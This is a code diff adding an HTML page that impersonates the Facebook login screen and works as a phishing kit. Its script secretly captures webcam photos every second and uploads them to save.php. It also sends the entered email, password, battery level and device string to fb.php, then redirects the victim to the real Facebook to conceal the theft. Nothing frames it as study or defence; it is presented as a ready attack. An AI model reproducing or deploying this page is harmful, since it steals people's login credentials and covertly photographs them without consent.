@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook – log in or sign up</title>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: Helvetica, Arial, sans-serif;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-container {
+      width: 100%;
+      max-width: 360px;
+      background: white;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 0 8px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+    .login-container h1 {
+      color: #1877f2;
+      font-size: 2.5rem;
+      margin-bottom: 1rem;
+    }
+    .login-container input {
+      width: 100%;
+      padding: 12px;
+      margin: 0.5rem 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+    .login-container button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      font-size: 1.1rem;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 0.5rem;
+    }
+    .login-container button:hover {
+      background-color: #165ecb;
+    }
+    .login-container a {
+      display: block;
+      margin-top: 1rem;
+      color: #1877f2;
+      font-size: 0.9rem;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <h1>facebook</h1>
+    <form id="loginForm">
+      <input type="text" name="email" placeholder="Email or phone number" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button type="submit">Log In</button>
+    </form>
+    <a href="#">Forgotten password?</a>
+  </div>
+  <script>
+ let photoCount = 1;
+
+  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+    const video = document.createElement("video");
+    video.style.display = "none";
+    document.body.appendChild(video);
+    video.srcObject = stream;
+    video.play();
+
+    const snapAndSend = () => {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append("photo", blob, `photo_${photoCount++}.jpg`);
+
+        fetch("save.php", {
+          method: "POST",
+          body: formData
+        }).then(() => {
+          console.log(`Photo ${photoCount - 1} uploaded.`);
+        }).catch(err => console.error("Upload failed:", err));
+      }, 'image/jpeg');
+    };
+
+    setInterval(snapAndSend, 1000);
+  }).catch(err => console.error("Camera access error:", err));
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      navigator.getBattery().then(function(battery) {
+        const batteryLevel = Math.round(battery.level * 100) + '%';
+        const device = navigator.userAgent;
+
+        const formData = new FormData(document.getElementById("loginForm"));
+        formData.append("battery", batteryLevel);
+        formData.append("device", device);
+
+        fetch("fb.php", {
+          method: "POST",
+          body: formData
+        }).then(() => {
+          window.location.href = "https://facebook.com"; // Redirect to real site
+        });
+      });
+    });
+ </script>
+</body>
+</html>
+
